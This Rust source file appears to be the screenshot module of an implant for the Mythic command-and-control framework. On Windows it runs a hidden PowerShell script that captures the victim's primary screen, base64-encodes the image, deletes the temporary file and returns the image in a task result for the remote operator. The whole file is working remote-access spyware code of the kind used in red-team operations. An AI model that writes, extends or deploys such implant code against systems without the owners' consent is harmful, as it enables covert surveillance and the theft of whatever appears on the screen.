// screenshot.rs
use crate::AgentTask;
use crate::mythic_success;
use std::error::Error;
use std::result::Result;

#[cfg(target_os = "windows")]
use std::process::Command;

#[cfg(target_os = "windows")]
pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    use std::fs;
    use std::path::Path;
    
    // Create a temporary file for the screenshot
    let temp_dir = std::env::temp_dir();
    let screenshot_path = temp_dir.join("screenshot.bmp");
    
    // Use PowerShell to take a screenshot
    let ps_command = format!(
        r#"
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $screen.Size)
        $graphics.Dispose()
        
        $bitmap.Save('{}', [System.Drawing.Imaging.ImageFormat]::Bmp)
        $bitmap.Dispose()
        "#,
        screenshot_path.to_string_lossy().replace('\\', "\\\\")
    );
    
    // Execute PowerShell command
    let output = Command::new("powershell")
        .args(&["-Command", &ps_command])
        .output()?;
    
    if !output.status.success() {
        let error_msg = String::from_utf8_lossy(&output.stderr);
        return Err(format!("PowerShell screenshot failed: {}", error_msg).into());
    }
    
    // Check if the screenshot file was created
    if !screenshot_path.exists() {
        return Err("Screenshot file was not created".into());
    }
    
    // Read the screenshot file
    let screenshot_data = fs::read(&screenshot_path)?;
    
    // Clean up the temporary file
    let _ = fs::remove_file(&screenshot_path);
    
    // Encode the screenshot data as base64
    let encoded_data = base64::encode(&screenshot_data);
    
    // Return success with the screenshot data
    Ok(mythic_success!(
        task.id,
        format!("Screenshot taken successfully. Size: {} bytes", screenshot_data.len()),
        {
            "size": screenshot_data.len(),
            "data": encoded_data,
            "format": "bmp"
        }
    ))
}

#[cfg(not(target_os = "windows"))]
pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Error>> {
    Err("Screenshot functionality is only supported on Windows".into())
}
